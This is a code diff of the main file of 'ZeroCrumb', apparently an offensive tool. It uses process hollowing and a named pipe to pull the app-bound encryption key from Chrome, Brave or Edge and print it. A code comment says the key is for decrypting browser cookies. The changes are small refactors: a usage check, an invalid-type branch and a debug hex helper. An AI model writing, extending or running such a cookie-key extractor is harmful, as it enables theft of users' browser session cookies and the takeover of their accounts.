@@ -1,32 +1,21 @@
-#include "./src/comm/comm.h"
-#include "./src/hollowing/hollowing.h"
-#include "./src/config/config.h"
-
 #include <iostream>
 #include<windows.h>
 
-#include <fstream>
-#include <sstream>
-#include <iomanip>
+#include "./src/comm/comm.h"
+#include "./src/hollowing/hollowing.h"
+#include "./src/config/config.h"
+#include "./src/dbg/dbg.h"
 
-using std::ostringstream;
-using std::string;
 
-using std::setw;
-using std::hex;
-using std::setfill;
-
-string KeyBytesToHexString(const BYTE* byteArray) {
-    ostringstream oss;
-    for (size_t i = 0; i < comm::keySize; ++i) {
-        oss << hex << setw(2) << setfill('0') << static_cast<int>(byteArray[i]);
-    }
-    return oss.str();
-}
 int main(int argc, char* argv[])
 {
 
-    // 0 = chrome, 1 = brave, 2 = edge
+    if (argc < 2) {
+        printf("Usage: ZeroCrumb.exe <BROWSER_TYPE>\n");
+        return -1;
+    }
+
+    // chrome = 0, brave = 1, edge = 2
     DWORD browserType = atoi(argv[1]);
 
     BrowserPathConfig browserConfig;
@@ -43,6 +32,10 @@ int main(int argc, char* argv[])
     case BrowserType::Edge:
         browserConfig = config::edge;
         break;
+
+    default:
+        printf("[-] Invalid Browser Type.\n");
+        return -1;
     }
     
 
@@ -55,13 +48,16 @@ int main(int argc, char* argv[])
     Sleep(250);
 
     HANDLE pipe = comm::connectToPipe();
-    PBYTE key = comm::readAppBoundKey(pipe);
+    PBYTE key = comm::readAppBoundKey(pipe); // can use in cookie decryption code
 
     if (!key) {
         printf("[-] Failed To Read Key From Zero Crumb Named Pipe.\n");
     }
     else {
-        string strKey = KeyBytesToHexString(key);
-        printf("[+] App Bound Key: %s\n", strKey.c_str()); // now you can use this in your cookie decryption code
+        string strKey = dbg::getHexABK(key);
+
+        printf("[+] App Bound Key Address: 0x%p\n", key);
+        printf("[+] App Bound Key: %s\n", strKey.c_str());
     }
+
 }
